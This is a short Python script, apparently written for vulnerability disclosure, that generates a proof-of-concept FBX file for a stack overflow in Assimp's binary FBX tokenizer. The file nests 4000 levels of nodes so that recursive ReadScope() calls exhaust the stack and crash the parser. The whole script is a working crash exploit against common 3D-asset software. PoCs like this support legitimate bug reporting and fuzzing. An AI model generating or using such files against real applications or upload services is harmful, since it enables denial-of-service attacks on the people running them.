#!/usr/bin/env python3
"""Generate PoC for Assimp FBX binary tokenizer stack overflow.

The FBX binary format uses recursive ReadScope() calls for nested nodes.
A file with ~4000+ levels of nesting exhausts the stack, causing a crash
in FBXBinaryTokenizer.cpp ReadScope()/ReadString().
"""
import struct
import os

OUT = os.path.dirname(os.path.abspath(__file__))


def make_fbx_deep_nesting(depth=4000):
    magic = b"Kaydara FBX Binary"
    padding = b"\x20\x20\x00\x1a\x00"
    version = struct.pack("<I", 7400)
    header = magic + padding + version

    sentinel = b"\x00" * 13  # 32-bit null record

    # Build from the inside out: each node wraps its child.
    # Node header = 14 bytes (end_offset:4 + prop_count:4 + prop_length:4 + name_len:1 + name:1)
    # Each level adds 14 (header) + 13 (sentinel) = 27 bytes
    content = b""
    for i in range(depth):
        node_header = struct.pack("<I", 0)  # placeholder end_offset
        node_header += struct.pack("<II", 0, 0)  # prop_count=0, prop_length=0
        node_header += struct.pack("<B", 1) + b"N"  # name = "N"
        content = node_header + content + sentinel

    payload = bytearray(header + content + sentinel)

    # Fix absolute end_offsets
    pos = len(header)
    for i in range(depth):
        remaining_levels = depth - 1 - i
        end_off = pos + 14 + remaining_levels * 27 + 13
        struct.pack_into("<I", payload, pos, end_off)
        pos += 14

    out_path = os.path.join(OUT, "poc.fbx")
    with open(out_path, "wb") as f:
        f.write(bytes(payload))
    print(f"Written {len(payload)} bytes to {out_path} (depth={depth})")


if __name__ == "__main__":
    make_fbx_deep_nesting(4000)
